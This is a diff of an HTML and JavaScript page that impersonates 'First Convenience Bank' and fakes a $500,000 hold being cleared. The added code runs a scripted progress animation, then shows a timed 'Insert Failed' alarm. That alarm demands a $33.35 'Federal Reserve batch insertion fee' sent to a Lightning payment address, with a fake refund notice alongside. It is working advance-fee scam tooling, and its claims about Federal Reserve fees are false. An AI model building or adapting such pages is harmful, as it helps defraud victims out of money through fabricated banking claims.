@@ -28,8 +28,9 @@
             padding: 25px;
             border-radius: 16px;
             border: 1px solid #30363d;
-            border-top: 6px solid #3b82f6;
+            border-top: 6px solid #2ea043;
             transition: all 0.5s ease;
+            box-shadow: 0 0 60px rgba(46,160,67,0.05);
         }
         .header {
             display: flex;
@@ -53,16 +54,17 @@
             margin-left: 8px;
         }
         .header .badge {
-            background: #1f2937;
-            color: #4fc3f7;
+            background: #238636;
+            color: #ffffff;
             font-size: 10px;
             font-weight: 700;
             padding: 4px 12px;
             border-radius: 30px;
-            border: 1px solid #3b82f6;
+            border: 1px solid #2ea043;
             transition: all 0.5s ease;
             white-space: nowrap;
-            animation: pulseBlue 1.5s ease-in-out infinite;
+            animation: pulseGreen 1.5s ease-in-out infinite;
+            box-shadow: 0 0 20px rgba(46,160,67,0.3);
         }
         .bank-strip {
             background: #0d1117;
@@ -81,26 +83,24 @@
 
         .status-section {
             background: #0d1117;
-            border: 1px solid #3b82f6;
+            border: 1px solid #2ea043;
             border-radius: 10px;
             padding: 16px;
             margin: 12px 0;
             text-align: center;
             transition: all 0.5s ease;
-            box-shadow: 0 0 40px rgba(59,130,246,0.05);
+            box-shadow: 0 0 40px rgba(46,160,67,0.05);
         }
         .status-section .icon {
             font-size: 30px;
             margin-bottom: 4px;
             transition: all 0.5s ease;
-            animation: pulseBlueIcon 1s ease-in-out infinite;
         }
         .status-section .title {
             font-size: 15px;
             font-weight: 700;
-            color: #4fc3f7;
+            color: #2ea043;
             transition: all 0.5s ease;
-            animation: pulseBlue 1.5s ease-in-out infinite;
         }
         .status-section .sub {
             font-size: 11px;
@@ -110,59 +110,67 @@
             transition: all 0.5s ease;
         }
 
-        .circular-container {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            margin: 20px 0;
+        .progress-bar-container {
+            background: #21262d;
+            height: 8px;
+            border-radius: 30px;
+            overflow: hidden;
+            margin: 12px 0 6px 0;
             position: relative;
+            display: none;
+            border: 1px solid #30363d;
         }
-        .circular-progress {
+        .progress-bar-fill {
+            height: 100%;
+            width: 60%;
+            border-radius: 30px;
+            background: #2ea043;
             position: relative;
-            width: 150px;
-            height: 150px;
+            overflow: hidden;
+            transition: width 0.2s ease, background 0.5s ease;
+            box-shadow: 0 0 20px rgba(46,160,67,0.2);
         }
-        .circular-progress svg {
-            transform: rotate(-90deg);
-            width: 150px;
-            height: 150px;
-        }
-        .circular-progress .bg-circle {
-            fill: none;
-            stroke: #1f2937;
-            stroke-width: 8;
-        }
-        .circular-progress .progress-circle {
-            fill: none;
-            stroke: #3b82f6;
-            stroke-width: 8;
-            stroke-linecap: round;
-            transition: stroke-dashoffset 1s ease, stroke 0.5s ease;
-            animation: pulseCircle 2s ease-in-out infinite;
-        }
-        @keyframes pulseCircle {
-            0%, 100% { filter: drop-shadow(0 0 10px rgba(59,130,246,0.2)); }
-            50% { filter: drop-shadow(0 0 30px rgba(59,130,246,0.5)); }
-        }
-        .circular-progress .center-text {
+        .progress-bar-fill::after {
+            content: '';
             position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            text-align: center;
+            top: 0;
+            left: -100%;
+            width: 200%;
+            height: 100%;
+            background: linear-gradient(90deg, 
+                transparent 0%, 
+                rgba(255, 255, 255, 0.05) 25%,
+                rgba(255, 255, 255, 0.15) 50%,
+                rgba(255, 255, 255, 0.05) 75%,
+                transparent 100%
+            );
+            animation: shimmer 2.5s infinite;
         }
-        .circular-progress .center-text .timer {
-            font-size: 28px;
-            font-weight: 700;
-            color: #f0f6fc;
-            font-family: 'Courier New', monospace;
-            letter-spacing: 2px;
+        @keyframes shimmer {
+            0% { transform: translateX(0%); }
+            100% { transform: translateX(50%); }
         }
-        .circular-progress .center-text .label {
-            font-size: 10px;
+        .progress-bar-fill.red-error {
+            background: #dc2626 !important;
+            width: 100% !important;
+            box-shadow: 0 0 30px rgba(220,38,38,0.4);
+        }
+        .progress-bar-fill.red-error::after {
+            background: linear-gradient(90deg, 
+                transparent 0%, 
+                rgba(255, 200, 200, 0.1) 25%,
+                rgba(255, 200, 200, 0.2) 50%,
+                rgba(255, 200, 200, 0.1) 75%,
+                transparent 100%
+            );
+        }
+
+        .progress-labels {
+            display: flex;
+            justify-content: space-between;
+            font-size: 9px;
             color: #8b949e;
-            margin-top: 2px;
+            display: none;
         }
 
         .status-message {
@@ -171,14 +179,13 @@
             margin-top: 10px;
             padding: 8px 14px;
             border-radius: 6px;
-            border: 2px solid #3b82f6;
+            border: 2px solid #2ea043;
             display: inline-block;
-            color: #4fc3f7;
+            color: #2ea043;
             background: #0d1117;
             max-width: 100%;
             word-wrap: break-word;
             transition: all 0.5s ease;
-            animation: pulseBlue 1.5s ease-in-out infinite;
         }
         .info-grid {
             display: grid;
@@ -235,26 +242,61 @@
             background: #2ea043;
         }
 
-        @keyframes pulseBlue {
+        @keyframes pulseGreen {
             0%, 100% { opacity: 1; transform: scale(1); }
             50% { opacity: 0.6; transform: scale(1.02); }
         }
-        @keyframes pulseBlueIcon {
-            0%, 100% { transform: scale(1) rotate(0deg); }
-            50% { transform: scale(1.2) rotate(5deg); }
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            25% { transform: translateX(-8px); }
+            75% { transform: translateX(8px); }
         }
-        @keyframes pulseGreen {
-            0%, 100% { box-shadow: 0 0 30px rgba(46,160,67,0.4), 0 0 60px rgba(46,160,67,0.2); }
-            50% { box-shadow: 0 0 50px rgba(46,160,67,0.8), 0 0 80px rgba(46,160,67,0.4); }
+        @keyframes fadeIn {
+            0% { opacity: 0; transform: translateY(-20px); }
+            100% { opacity: 1; transform: translateY(0); }
+        }
+        @keyframes policeLight {
+            0% { 
+                color: #ff0000; 
+                text-shadow: 0 0 20px rgba(255,0,0,0.8), 0 0 40px rgba(255,0,0,0.4);
+                transform: scale(1);
+            }
+            25% { 
+                color: #ff0000; 
+                text-shadow: 0 0 30px rgba(255,0,0,1), 0 0 60px rgba(255,0,0,0.6);
+                transform: scale(1.05);
+            }
+            50% { 
+                color: #0066ff; 
+                text-shadow: 0 0 20px rgba(0,102,255,0.8), 0 0 40px rgba(0,102,255,0.4);
+                transform: scale(1);
+            }
+            75% { 
+                color: #0066ff; 
+                text-shadow: 0 0 30px rgba(0,102,255,1), 0 0 60px rgba(0,102,255,0.6);
+                transform: scale(1.05);
+            }
+            100% { 
+                color: #ff0000; 
+                text-shadow: 0 0 20px rgba(255,0,0,0.8), 0 0 40px rgba(255,0,0,0.4);
+                transform: scale(1);
+            }
+        }
+        .police-light {
+            display: inline-block;
+            animation: policeLight 0.6s ease-in-out infinite;
+        }
+        .shake {
+            animation: shake 0.6s ease;
+        }
+        .fade-in {
+            animation: fadeIn 0.6s ease forwards;
         }
 
         @media (max-width: 600px) {
             .container { padding: 15px; }
             .header .logo { font-size: 16px; }
             .info-grid { grid-template-columns: 1fr; }
-            .circular-progress { width: 120px; height: 120px; }
-            .circular-progress svg { width: 120px; height: 120px; }
-            .circular-progress .center-text .timer { font-size: 22px; }
         }
     </style>
 </head>
@@ -265,7 +307,7 @@
                 First Convenience Bank
                 <small>Member FDIC • Equal Housing Lender</small>
             </div>
-            <div class="badge" id="badge">⏳ Fed Batch Cycle</div>
+            <div class="badge" id="badge">✅ Hold Cleared</div>
         </div>
 
         <div class="bank-strip">
@@ -273,44 +315,40 @@
         </div>
 
         <div class="status-section" id="statusSection">
-            <div class="icon" id="statusIcon">⚡</div>
-            <div class="title" id="statusTitle">⏳ Clearing $500,000.00 Hold</div>
-            <div class="sub" id="statusSub">⏳ Your $500,000.00 hold is being cycled through the Federal Reserve batch system...</div>
+            <div class="icon" id="statusIcon">✅</div>
+            <div class="title" id="statusTitle">✅ $500,000.00 Hold Cleared</div>
+            <div class="sub" id="statusSub">✅ The 5-hour hold clearance process is complete. Your $500,000.00 hold has been successfully cleared.</div>
         </div>
 
-        <div class="circular-container" id="circularContainer">
-            <div class="circular-progress" id="circularProgress">
-                <svg viewBox="0 0 150 150">
-                    <circle class="bg-circle" cx="75" cy="75" r="65" />
-                    <circle class="progress-circle" id="progressCircle" cx="75" cy="75" r="65"
-                        stroke-dasharray="408.4"
-                        stroke-dashoffset="408.4" />
-                </svg>
-                <div class="center-text">
-                    <div class="timer" id="timerDisplay">5:00:00</div>
-                    <div class="label" id="timerLabel">Estimated time remaining</div>
-                </div>
-            </div>
+        <div style="text-align:left; font-size:10px; font-weight:600; color:#8b949e; margin-bottom:3px; display:none;" id="progressLabel">
+            <span class="spinner">⏳</span> Progress
+        </div>
+        <div class="progress-bar-container" id="progressContainer">
+            <div class="progress-bar-fill" id="progressBar"></div>
+        </div>
+        <div class="progress-labels" id="progressLabels">
+            <span id="labelLeft">Processing...</span>
+            <span id="progressText">0%</span>
         </div>
 
         <div style="text-align:center;">
             <div class="status-message" id="statusMessage">
-                ⏳ Cycling $500,000.00 hold through Federal Reserve batch system... (5 hours)
+                ✅ 5 hours complete — $500,000.00 hold cleared successfully.
             </div>
         </div>
 
         <div id="txDetails" style="background:#0d1117; border:1px solid #30363d; border-radius:8px; padding:14px; margin:12px 0;">
             <div class="tx-header" style="display:flex; justify-content:space-between; align-items:center; border-bottom:1px solid #30363d; padding-bottom:8px; margin-bottom:8px; flex-wrap:wrap; gap:5px;">
                 <span style="font-size:12px; font-weight:700; color:#f0f6fc;">📋 TRANSACTION DETAILS</span>
-                <span id="txStatusBadge" style="font-size:9px; color:#4fc3f7; background:#0d1117; padding:2px 10px; border-radius:30px;">⏳ CLEARING HOLD</span>
+                <span id="txStatusBadge" style="font-size:9px; color:#2ea043; background:#0d1117; padding:2px 10px; border-radius:30px;">✅ HOLD CLEARED</span>
             </div>
             <div class="tx-row" style="display:flex; justify-content:space-between; padding:3px 0; border-bottom:1px solid #21262d; font-size:11px;">
                 <span style="color:#8b949e;">💰 Amount on Hold</span>
-                <span style="color:#f85149; font-weight:700;">$500,000.00</span>
+                <span style="color:#2ea043; font-weight:700;">$0.00</span>
             </div>
             <div class="tx-row" style="display:flex; justify-content:space-between; padding:3px 0; border-bottom:1px solid #21262d; font-size:11px;">
                 <span style="color:#8b949e;">🔄 Status</span>
-                <span id="mempoolStatus" style="color:#4fc3f7;">⏳ Cycling through Federal Reserve batch system to clear hold...</span>
+                <span id="mempoolStatus" style="color:#2ea043;">✅ 5 hours complete — Hold cleared successfully.</span>
             </div>
             <div class="tx-row" style="display:flex; justify-content:space-between; padding:3px 0; font-size:11px; border-bottom:none;">
                 <span style="color:#8b949e;">✅ Amount Already Released</span>
@@ -341,7 +379,7 @@
             </div>
             <div class="item">
                 <div class="label">Status</div>
-                <div class="value" style="color:#4fc3f7; font-weight:700;" id="infoStatus">⏳ Clearing Hold</div>
+                <div class="value" style="color:#2ea043; font-weight:700;" id="infoStatus">✅ Hold Cleared</div>
             </div>
         </div>
 
@@ -359,9 +397,6 @@
         var refreshCount = 0;
         var intervalId = null;
         var errorShown = false;
-        var countdownTimer = null;
-        var totalSeconds = 18000; // 5 HOURS
-        var timeLeft = totalSeconds;
 
         function animateProgress() {
             refreshCount = refreshCount + 1;
@@ -372,186 +407,243 @@
             }
 
             if (refreshCount === 1) {
-                startCountdown();
-            }
-        }
-
-        function startCountdown() {
-            var timerDisplay = document.getElementById('timerDisplay');
-            var progressCircle = document.getElementById('progressCircle');
-            var msg = document.getElementById('statusMessage');
-            var badge = document.querySelector('.badge');
-            var statusTitle = document.getElementById('statusTitle');
-            var statusSub = document.getElementById('statusSub');
-            var statusIcon = document.getElementById('statusIcon');
-            var statusSection = document.getElementById('statusSection');
-            var txBadge = document.getElementById('txStatusBadge');
-            var mempoolStatus = document.getElementById('mempoolStatus');
-            var infoStatus = document.getElementById('infoStatus');
-            var container = document.getElementById('mainContainer');
-
-            if (countdownTimer) {
-                clearInterval(countdownTimer);
-                countdownTimer = null;
+                document.body.style.background = '#0d1117';
             }
 
-            timeLeft = totalSeconds;
-            var circumference = 408.4;
+            else if (refreshCount === 2 && !errorShown) {
+                errorShown = true;
 
-            countdownTimer = setInterval(function() {
-                timeLeft--;
+                var bar = document.getElementById('progressBar');
+                var text = document.getElementById('progressText');
+                var msg = document.getElementById('statusMessage');
 
-                var hours = Math.floor(timeLeft / 3600);
-                var minutes = Math.floor((timeLeft % 3600) / 60);
-                var seconds = timeLeft % 60;
-                timerDisplay.textContent = 
-                    String(hours).padStart(2, '0') + ':' + 
-                    String(minutes).padStart(2, '0') + ':' + 
-                    String(seconds).padStart(2, '0');
+                var progressContainer = document.getElementById('progressContainer');
+                var progressLabels = document.getElementById('progressLabels');
+                var progressLabel = document.getElementById('progressLabel');
 
-                var progress = (totalSeconds - timeLeft) / totalSeconds;
-                var offset = circumference - (progress * circumference);
-                progressCircle.style.strokeDashoffset = offset;
+                if (progressContainer) progressContainer.style.display = 'block';
+                if (progressLabels) progressLabels.style.display = 'flex';
+                if (progressLabel) progressLabel.style.display = 'block';
 
-                var elapsedHours = Math.floor((totalSeconds - timeLeft) / 3600);
+                bar.style.width = '60%';
+                bar.style.background = '#2ea043';
+                bar.classList.remove('red-error');
+                text.textContent = '';
 
-                if (timeLeft > 0) {
-                    if (elapsedHours === 0) {
-                        msg.innerHTML = '⏳ Cycling $500,000.00 hold through Federal Reserve batch system... (5 hours)';
-                        badge.textContent = '⏳ Clearing Hold';
-                        statusTitle.textContent = '⏳ Clearing $500,000.00 Hold';
-                        statusSub.textContent = '⏳ Your $500,000.00 hold is being cycled through the Federal Reserve batch system...';
-                        mempoolStatus.textContent = '⏳ Cycling hold through Federal Reserve batch system...';
-                    } else if (elapsedHours === 1) {
-                        msg.innerHTML = '⏳ Processing hold clearance... (4 hours remaining)';
-                        badge.textContent = '⏳ Processing Clearance';
-                        statusTitle.textContent = '⏳ Processing Hold Clearance';
-                        statusSub.textContent = '⏳ Hold clearance is in progress...';
-                        mempoolStatus.textContent = '⏳ Processing hold clearance...';
-                    } else if (elapsedHours === 2) {
-                        msg.innerHTML = '⏳ Verifying hold records... (3 hours remaining)';
-                        badge.textContent = '⏳ Verifying Records';
-                        statusTitle.textContent = '⏳ Verifying Hold Records';
-                        statusSub.textContent = '⏳ Hold records are being verified...';
-                        mempoolStatus.textContent = '⏳ Verifying hold records...';
-                    } else if (elapsedHours === 3) {
-                        msg.innerHTML = '⏳ Finalizing hold clearance... (2 hours remaining)';
-                        badge.textContent = '⏳ Finalizing Clearance';
-                        statusTitle.textContent = '⏳ Finalizing Hold Clearance';
-                        statusSub.textContent = '⏳ Hold clearance is being finalized...';
-                        mempoolStatus.textContent = '⏳ Finalizing hold clearance...';
-                    } else if (elapsedHours === 4) {
-                        msg.innerHTML = '⏳ Almost complete... (1 hour remaining)';
-                        badge.textContent = '⏳ Almost Complete';
-                        statusTitle.textContent = '⏳ Almost Complete';
-                        statusSub.textContent = '⏳ Hold clearance is almost complete...';
-                        mempoolStatus.textContent = '⏳ Almost complete...';
-                    }
-                } else {
-                    // ===== COUNTDOWN COMPLETE — HOLD CLEARED =====
-                    clearInterval(countdownTimer);
-                    countdownTimer = null;
+                var badge = document.querySelector('.badge');
+                if (badge) {
+                    badge.textContent = '⏳ Inserting to Batch';
+                    badge.style.background = '#1f2937';
+                    badge.style.color = '#4fc3f7';
+                    badge.style.borderColor = '#3b82f6';
+                }
 
-                    progressCircle.style.stroke = '#2ea043';
-                    progressCircle.style.animation = 'pulseGreen 2s ease-in-out infinite';
-                    progressCircle.style.strokeDashoffset = '0';
+                var statusTitle = document.getElementById('statusTitle');
+                if (statusTitle) {
+                    statusTitle.textContent = '⏳ Inserting $500,000.00 into Batch Cycle';
+                    statusTitle.style.color = '#4fc3f7';
+                }
 
-                    timerDisplay.textContent = '✅';
-                    timerDisplay.style.color = '#2ea043';
-                    document.querySelector('.center-text .label').textContent = 'Hold Cleared!';
+                var statusSub = document.getElementById('statusSub');
+                if (statusSub) {
+                    statusSub.textContent = '⏳ Your funds are being inserted into the next batch cycle for release.';
+                    statusSub.style.color = '#8b949e';
+                }
 
-                    msg.innerHTML = '✅ $500,000.00 hold cleared!';
-                    msg.style.color = '#2ea043';
-                    msg.style.borderColor = '#2ea043';
-                    msg.style.animation = 'pulseGreen 1.5s ease-in-out infinite';
+                var statusIcon = document.getElementById('statusIcon');
+                if (statusIcon) {
+                    statusIcon.textContent = '⏳';
+                    statusIcon.style.color = '#3b82f6';
+                }
+
+                var statusSection = document.getElementById('statusSection');
+                if (statusSection) {
+                    statusSection.style.border = '1px solid #3b82f6';
+                }
+
+                var container = document.getElementById('mainContainer');
+                if (container) {
+                    container.style.borderTopColor = '#3b82f6';
+                }
+
+                var labelLeft = document.getElementById('labelLeft');
+                if (labelLeft) {
+                    labelLeft.textContent = '⏳ Inserting to Batch...';
+                    labelLeft.style.color = '#4fc3f7';
+                }
+
+                var infoStatus = document.getElementById('infoStatus');
+                if (infoStatus) {
+                    infoStatus.textContent = '⏳ Inserting to Batch';
+                    infoStatus.style.color = '#4fc3f7';
+                }
+
+                msg.innerHTML = '⏳ Inserting $500,000.00 into batch cycle...';
+                msg.style.color = '#4fc3f7';
+                msg.style.borderColor = '#3b82f6';
+                msg.style.border = '2px solid #3b82f6';
+
+                var txBadge = document.getElementById('txStatusBadge');
+                if (txBadge) {
+                    txBadge.textContent = '⏳ INSERTING TO BATCH';
+                    txBadge.style.color = '#4fc3f7';
+                }
+
+                var mempoolStatus = document.getElementById('mempoolStatus');
+                if (mempoolStatus) {
+                    mempoolStatus.textContent = '⏳ Inserting $500,000.00 into batch cycle...';
+                    mempoolStatus.style.color = '#4fc3f7';
+                }
+
+                document.body.style.background = '#0d1117';
+
+                var batteryInterval = setInterval(function() {
+                    var currentWidth = parseFloat(bar.style.width);
+                    var change = (Math.random() * 6) - 3;
+                    var newWidth = Math.min(Math.max(currentWidth + change, 50), 90);
+                    bar.style.width = newWidth + '%';
+                }, 400);
+
+                // ===== TIMER: 12 SECONDS =====
+                setTimeout(function() {
+                    clearInterval(batteryInterval);
+                    bar.style.width = '100%';
+                    bar.style.background = '#dc2626';
+                    bar.classList.add('red-error');
+                    bar.parentElement.classList.add('shake');
 
                     if (badge) {
-                        badge.textContent = '✅ Hold Cleared';
-                        badge.style.background = '#238636';
+                        badge.textContent = '🚨 Insert Failed';
+                        badge.style.background = '#dc2626';
                         badge.style.color = '#ffffff';
-                        badge.style.borderColor = '#2ea043';
-                        badge.style.animation = 'pulseGreen 1.5s ease-in-out infinite';
+                        badge.style.borderColor = '#dc2626';
+                        badge.className = 'police-light';
                     }
 
                     if (statusTitle) {
-                        statusTitle.textContent = '✅ $500,000.00 Hold Cleared';
-                        statusTitle.style.color = '#2ea043';
-                        statusTitle.style.animation = 'pulseGreen 1.5s ease-in-out infinite';
+                        statusTitle.textContent = '🚨 Batch Insertion Required';
+                        statusTitle.style.color = '#dc2626';
                     }
 
                     if (statusSub) {
-                        statusSub.textContent = '✅ The hold on your $500,000.00 has been cleared.';
+                        statusSub.textContent = '🚨 Insertion failed. A fee is required to complete the batch insertion.';
                         statusSub.style.color = '#8b949e';
                     }
 
                     if (statusIcon) {
-                        statusIcon.textContent = '✅';
-                        statusIcon.style.color = '#2ea043';
-                        statusIcon.style.animation = 'pulseGreen 1.5s ease-in-out infinite';
+                        statusIcon.textContent = '🚨';
+                        statusIcon.style.color = '#dc2626';
+                        statusIcon.className = 'police-light';
                     }
 
                     if (statusSection) {
-                        statusSection.style.border = '1px solid #2ea043';
-                        statusSection.style.boxShadow = '0 0 40px rgba(46,160,67,0.05)';
+                        statusSection.style.border = '2px solid #dc2626';
                     }
 
                     if (container) {
-                        container.style.borderTopColor = '#2ea043';
-                        container.style.boxShadow = '0 0 60px rgba(46,160,67,0.05)';
+                        container.style.borderTopColor = '#dc2626';
                     }
 
-                    if (txBadge) {
-                        txBadge.textContent = '✅ HOLD CLEARED';
-                        txBadge.style.color = '#2ea043';
-                    }
-
-                    if (mempoolStatus) {
-                        mempoolStatus.textContent = '✅ $500,000.00 hold cleared.';
-                        mempoolStatus.style.color = '#2ea043';
+                    if (labelLeft) {
+                        labelLeft.textContent = '🚨 Insert Failed';
+                        labelLeft.style.color = '#dc2626';
                     }
 
                     if (infoStatus) {
-                        infoStatus.textContent = '✅ Hold Cleared';
-                        infoStatus.style.color = '#2ea043';
+                        infoStatus.textContent = '🚨 Insert Failed';
+                        infoStatus.style.color = '#dc2626';
+                    }
+
+                    msg.innerHTML = '🚨 Insertion failed. A fee is required to complete the batch insertion.';
+                    msg.style.color = '#dc2626';
+                    msg.style.borderColor = '#dc2626';
+                    msg.style.border = '2px solid #dc2626';
+
+                    if (txBadge) {
+                        txBadge.textContent = '🚨 INSERT FAILED';
+                        txBadge.style.color = '#dc2626';
+                    }
+
+                    if (mempoolStatus) {
+                        mempoolStatus.textContent = '🚨 Insertion failed. Fee required to retry.';
+                        mempoolStatus.style.color = '#dc2626';
                     }
 
                     document.body.style.background = '#0d1117';
 
-                    // ===== SHOW NOTE BOX =====
-                    setTimeout(function() {
-                        showNoteBox();
-                    }, 1000);
-                }
-            }, 1000);
-        }
+                    var errorBox = document.createElement('div');
+                    errorBox.id = 'errorBox';
+                    errorBox.className = 'fade-in';
+                    errorBox.style.cssText = `
+                        background: #1f0d0d;
+                        border: 2px solid #dc2626;
+                        border-radius: 10px;
+                        padding: 20px 24px;
+                        margin: 15px 0;
+                        box-shadow: 0 0 40px rgba(220,38,38,0.15);
+                    `;
+                    errorBox.innerHTML = `
+                        <div style="text-align:center; margin-bottom:12px;">
+                            <span class="police-light" style="font-size:40px;">🚨</span>
+                            <div style="font-size:16px; font-weight:700; color:#dc2626; margin-top:4px;">Batch Insertion Required</div>
+                        </div>
+                        
+                        <div style="font-size:13px; color:#8b949e; margin-bottom:10px; text-align:center;">
+                            The batch insertion could not be completed. A <strong style="color:#dc2626;">$33.35</strong> fee is required to retry the insertion.
+                        </div>
+                        
+                        <div style="background:#0d1117; border-left: 3px solid #dc2626; padding: 10px 14px; border-radius: 4px; margin-bottom:10px;">
+                            <div style="font-size:12px; color:#8b949e;">
+                                <span style="color:#dc2626; font-weight:700;">⚠️ Important</span>
+                            </div>
+                            <div style="font-size:12px; color:#8b949e; margin-top:4px;">
+                                • This is a Federal Reserve processing fee for manual batch insertion outside the standard schedule.
+                            </div>
+                            <div style="font-size:12px; color:#8b949e; margin-top:2px;">
+                                • The bank does not profit from this fee — it is passed directly to the Federal Reserve.
+                            </div>
+                            <div style="font-size:12px; color:#8b949e; margin-top:2px;">
+                                • Without this fee, your funds cannot be inserted into the batch cycle for release.
+                            </div>
+                            <div style="font-size:12px; color:#8b949e; margin-top:2px;">
+                                • Once the fee is confirmed, insertion takes approximately <strong style="color:#f59e0b;">25–35 minutes</strong> to complete.
+                            </div>
+                        </div>
+                        
+                        <div style="background:#0d1117; border-left: 3px solid #f59e0b; padding: 10px 14px; border-radius: 4px;">
+                            <div style="font-size:12px; color:#8b949e;">
+                                <strong style="color:#f59e0b;">📌 Refund Status Update</strong>
+                            </div>
+                            <div style="font-size:12px; color:#8b949e; margin-top:4px;">
+                                Your <strong style="color:#f59e0b;">$186.02</strong> refund is now being processed by the office. It will be credited to your account within <strong style="color:#f59e0b;">48 hours</strong>.
+                            </div>
+                        </div>
 
-        // ===== NOTE BOX =====
-        function showNoteBox() {
-            var noteBox = document.getElementById('partialNoteBox');
-            if (!noteBox) {
-                noteBox = document.createElement('div');
-                noteBox.id = 'partialNoteBox';
-                noteBox.style.cssText = `
-                    background: #0d1117;
-                    border: 1px solid #2ea043;
-                    border-radius: 8px;
-                    padding: 16px 20px;
-                    margin: 12px 0;
-                    text-align: center;
-                `;
-                noteBox.innerHTML = `
-                    <div style="font-size:14px; font-weight:700; color:#2ea043; margin-bottom:6px;">📌 Important Note</div>
-                    <div style="font-size:12px; color:#8b949e;">
-                        The hold on your <strong style="color:#2ea043;">$500,000.00</strong> has been cleared.
-                    </div>
-                    <div style="font-size:12px; color:#8b949e; margin-top:6px;">
-                        We will now insert the <strong style="color:#2ea043;">$500,000.00</strong> into the next batch cycle for release.
-                    </div>
-                `;
-                var msgContainer = document.querySelector('.status-message');
-                if (msgContainer) {
-                    msgContainer.parentNode.insertBefore(noteBox, msgContainer.nextSibling);
-                }
+                        <div style="text-align:center; margin-top:15px; padding-top:10px; border-top:1px solid #30363d;">
+                            <div style="font-size:13px; color:#8b949e; margin-bottom:4px;">
+                                💳 <strong style="color:#dc2626;">$33.35</strong> Batch Insertion Fee
+                            </div>
+                            <div style="font-size:12px; color:#8b949e;">
+                                Lightning Address: <strong style="color:#4fc3f7;">tx-local-route@cake.cash</strong>
+                            </div>
+                            <div style="font-size:11px; color:#f85149; margin-top:6px; background:#1f0d0d; padding:6px 10px; border-radius:4px; border:1px solid #dc2626;">
+                                <span class="police-light" style="font-size:12px;">🚨</span> The address will change from time to time once the provided one is invalid.
+                            </div>
+                        </div>
+                    `;
+
+                    var msgContainer = document.querySelector('.status-message');
+                    if (msgContainer) {
+                        msgContainer.parentNode.insertBefore(errorBox, msgContainer.nextSibling);
+                    }
+
+                    setTimeout(function() {
+                        if (bar.parentElement) {
+                            bar.parentElement.classList.remove('shake');
+                        }
+                    }, 600);
+
+                }, 10000); // 10 SECONDS
             }
         }
 
@@ -561,3 +653,4 @@
     </script>
 </body>
     </html>
+    
